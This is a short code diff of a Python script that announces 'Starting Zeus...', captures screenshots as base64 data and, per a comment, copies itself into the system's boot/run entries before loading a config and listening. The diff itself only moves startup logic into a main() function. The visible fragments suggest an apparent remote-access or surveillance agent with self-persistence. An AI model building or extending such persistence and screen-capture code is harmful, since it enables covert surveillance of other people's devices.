@@ -1,8 +1,5 @@
 #!/usr/local/bin/python
 
-
-# Compile with Python 3 only
-
 # Core imports
 import urllib.request
 from threading import Thread
@@ -63,7 +60,7 @@ def takeScreenshot():
     dataImagePrefix = "data:image/png;base64,"
     base64Image = ""
 
-if __name__ == "__main__":
+def main():
     print("Starting Zeus...")
 
     # Check if agents exists on device, if not - immediately copy itself to system boot/run
@@ -77,3 +74,6 @@ if __name__ == "__main__":
     if didLoadConfSuccfully:
         initialize()
         startAndListen()
+
+if __name__ == "__main__":
+    main()
